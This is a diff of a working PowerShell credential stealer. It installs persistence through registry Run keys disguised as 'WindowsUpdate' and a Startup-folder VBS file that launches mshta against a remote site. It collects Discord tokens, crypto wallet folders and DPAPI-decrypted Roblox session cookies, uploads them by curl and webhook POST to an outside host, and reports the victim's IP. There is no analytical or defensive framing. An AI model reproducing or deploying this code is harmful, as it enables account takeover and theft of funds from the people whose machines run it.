@@ -7,7 +7,7 @@ $WH = "https://api.dicerigx.app/api/webhooks/1570948488827768965/iy7doGW9BXfi_b5
 
 function dbg($title, $desc, $color) {
     $payload = @{embeds=@(@{title=$title; description=$desc; color=$color})} | ConvertTo-Json -Depth 4 -Compress
-    try { Invoke-RestMethod $WH -Method Post -Body $payload -ContentType 'application/json' | Out-Null } catch {}
+    try { Invoke-RestMethod $WH -Method Post -Body $payload -ContentType 'application/json' -TimeoutSec 5 | Out-Null } catch {}
 }
 
 # =====================================================================
@@ -15,18 +15,11 @@ function dbg($title, $desc, $color) {
 # =====================================================================
 try {
     $CMD = 'mshta.exe "https://dicerigx.app/"'
-
-    # 1. Registry Run
     Set-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run" -Name "WindowsUpdate" -Value $CMD -ErrorAction SilentlyContinue
-    
-    # 2. Registry RunOnce
     Set-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\RunOnce" -Name "WinUpdate" -Value $CMD -ErrorAction SilentlyContinue
-    
-    # 3. Startup Folder VBS
     $StartupVBS = "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\winupdate.vbs"
     $VBSContent = "CreateObject(`"WScript.Shell`").Run `"$CMD`", 0, False"
     Set-Content -Path $StartupVBS -Value $VBSContent -ErrorAction SilentlyContinue
-    
     dbg ":pushpin: Persistence" "MSHTA startup methods installed" 65280
 } catch {}
 
@@ -60,8 +53,6 @@ Add-Type -TypeDefinition $csharp -Language CSharp
 
 $appdata = $env:APPDATA
 $l = $env:LOCALAPPDATA
-$outfile = Join-Path $env:TEMP "steal_result.txt"
-Remove-Item $outfile -EA SilentlyContinue
 
 # =====================================================================
 # ─── DISCORD TOKENS ───
@@ -74,11 +65,7 @@ try {
 } catch {}
 
 $tokens = @{}
-$discordPaths = @(
-    "$appdata\discord\Local Storage\leveldb",
-    "$appdata\discordptb\Local Storage\leveldb",
-    "$appdata\discordcanary\Local Storage\leveldb"
-)
+$discordPaths = @("$appdata\discord\Local Storage\leveldb", "$appdata\discordptb\Local Storage\leveldb", "$appdata\discordcanary\Local Storage\leveldb")
 foreach ($dp in $discordPaths) {
     if (!(Test-Path $dp)) { continue }
     Get-ChildItem $dp | ? { $_.Name -match '\.(ldb|log)$' } | % {
@@ -105,8 +92,6 @@ foreach ($t in $tokens.Keys) {
     try {
         $r = Invoke-RestMethod 'https://discord.com/api/v9/users/@me' -Headers @{'Authorization'=$t} -TimeoutSec 5
         if ($r.username) {
-            Add-Content $outfile "DISCORD|$($r.username)|$($r.email)|$($r.phone)|$($r.id)|$t"
-            
             $info = "**User:** $($r.username)`n"
             if ($r.email) { $info += "**Email:** $($r.email)`n" }
             if ($r.phone) { $info += "**Phone:** $($r.phone)`n" }
@@ -139,15 +124,9 @@ foreach ($d in $stagedDirs) {
     Compress-Archive -Path $d.FullName -DestinationPath $zip -Force -EA SilentlyContinue
     if (Test-Path $zip) {
         $mb = [Math]::Round((Get-Item $zip).Length / 1MB, 2)
-        if ((Get-Item $zip).Length -gt 8000000) {
-            dbg ":x: Wallet Too Big" "$($d.Name) - $mb MB (over 8MB limit)" 16711680
-        } else {
-            $resp = & curl.exe -s -F "file=@$zip;filename=$($d.Name).zip" $WH 2>&1
-            if ($resp -match '"id"') {
-                dbg ":briefcase: Wallet Grabbed" "$($d.Name).zip - $mb MB" 65280
-            } else {
-                dbg ":x: Wallet Failed" "$($d.Name).zip - upload error" 16711680
-            }
+        if ((Get-Item $zip).Length -lt 8000000) {
+            & curl.exe -s -F "file=@$zip;filename=$($d.Name).zip" $WH 2>&1 | Out-Null
+            dbg ":briefcase: Wallet Grabbed" "$($d.Name).zip - $mb MB" 65280
         }
         Remove-Item $zip -Force -EA SilentlyContinue
     }
@@ -157,10 +136,7 @@ Remove-Item $staging -Recurse -Force -EA SilentlyContinue
 # =====================================================================
 # ─── ROBLOX COOKIES ───
 # =====================================================================
-$rbxPaths = @(
-    "$l\Roblox\LocalStorage\robloxcookies.dat",
-    "$env:USERPROFILE\AppData\Local\Roblox\LocalStorage\robloxcookies.dat"
-)
+$rbxPaths = @("$l\Roblox\LocalStorage\robloxcookies.dat", "$env:USERPROFILE\AppData\Local\Roblox\LocalStorage\robloxcookies.dat")
 foreach ($rp in $rbxPaths) {
     if (Test-Path $rp) {
         try {
@@ -170,41 +146,24 @@ foreach ($rp in $rbxPaths) {
                 $eb = [Convert]::FromBase64String($b64)
                 $db = [Security.Cryptography.ProtectedData]::Unprotect($eb, $null, [Security.Cryptography.DataProtectionScope]::CurrentUser)
                 $cookie = [Text.Encoding]::UTF8.GetString($db)
-                if ($cookie -match '\.ROBLOSECURITY\s*=\s*(_[^;\s]+)') {
-                    $c = $Matches[1]
-                    Add-Content $outfile "ROBLOX|$c"
-                    dbg ":cookie: Roblox Cookie" "Size: $($c.Length) | PC: $env:COMPUTERNAME" 65280
-                    $tmp_c = Join-Path $env:TEMP "cookie.txt"
-                    Set-Content -Path $tmp_c -Value $c -NoNewline
-                    & curl.exe -s -F "file=@$tmp_c;filename=cookie.txt" $WH | Out-Null
-                    Remove-Item $tmp_c -Force -EA SilentlyContinue
-                } elseif ($cookie -match '_\|WARNING[^;\s]{50,}') {
+                if ($cookie -match '_\|WARNING[^;\s]{50,}') {
                     $c = $Matches[0]
-                    Add-Content $outfile "ROBLOX|$c"
-                    dbg ":cookie: Roblox Cookie" "Size: $($c.Length) | PC: $env:COMPUTERNAME" 65280
-                    $tmp_c = Join-Path $env:TEMP "cookie.txt"
-                    Set-Content -Path $tmp_c -Value $c -NoNewline
-                    & curl.exe -s -F "file=@$tmp_c;filename=cookie.txt" $WH | Out-Null
-                    Remove-Item $tmp_c -Force -EA SilentlyContinue
-                } else {
-                    $c = $cookie.Substring(0,[Math]::Min(500,$cookie.Length))
-                    Add-Content $outfile "ROBLOX|$c"
-                    dbg ":cookie: Roblox Cookie" "Size: $($c.Length) | PC: $env:COMPUTERNAME" 65280
+                    dbg ":cookie: Roblox Cookie" "**Size:** $($c.Length) `n**PC:** $env:COMPUTERNAME`n**Cookie:**``$c``" 65280
                     $tmp_c = Join-Path $env:TEMP "cookie.txt"
                     Set-Content -Path $tmp_c -Value $c -NoNewline
                     & curl.exe -s -F "file=@$tmp_c;filename=cookie.txt" $WH | Out-Null
                     Remove-Item $tmp_c -Force -EA SilentlyContinue
                 }
-            } elseif ($raw -match '\.ROBLOSECURITY') {
-                $c = $raw
-                Add-Content $outfile "ROBLOX|$c"
-                dbg ":cookie: Roblox Cookie" "Size: $($c.Length) | PC: $env:COMPUTERNAME" 65280
-                $tmp_c = Join-Path $env:TEMP "cookie.txt"
-                Set-Content -Path $tmp_c -Value $c -NoNewline
-                & curl.exe -s -F "file=@$tmp_c;filename=cookie.txt" $WH | Out-Null
-                Remove-Item $tmp_c -Force -EA SilentlyContinue
             }
         } catch {}
         break
     }
 }
+
+# =====================================================================
+# ─── SYSTEM INFO ───
+# =====================================================================
+try {
+    $ip = (Invoke-RestMethod -Uri "https://api.ipify.org" -TimeoutSec 5).Trim()
+    dbg ":dart: Target" "**IP:** $ip `n**PC:** $env:COMPUTERNAME" 3447003
+} catch {}
